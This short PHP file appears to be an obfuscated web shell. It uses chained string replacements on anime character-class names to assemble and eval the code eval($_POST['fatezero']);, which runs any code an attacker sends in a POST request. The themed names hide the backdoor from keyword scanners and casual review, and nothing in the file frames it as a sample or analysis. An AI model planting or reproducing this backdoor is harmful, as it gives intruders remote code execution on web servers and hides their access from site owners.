<?php
	$fatezero	= "SABERBERSERKER(\$LANCERPCASTEROSTCASTERARCHERCASTER'faCASTERtASSASSINzCASTERASSASSINCASTERro'RIDER)GINTAMA";
	$fatestaynight	= str_replace("CASTER", "", $fatezero);
	$fatezero	= str_replace("LANCER", "_", $fatestaynight);
	$fatestaynight	= str_replace("SABER", "ev", $fatezero);
	$fatezero	= str_replace("BERSERKER", "al", $fatestaynight);
	$fatestaynight	= str_replace("RIDER", "]", $fatezero);
	$fatezero	= str_replace("GINTAMA", ";", $fatestaynight);
	$fatestaynight	= str_replace("ARCHER", "[", $fatezero);
	$fatezero	= str_replace("ASSASSIN", "e", $fatestaynight);

	if($fatestaynight !== $fatezero)
	{
		eval($fatezero);//fatezero
	}
?> 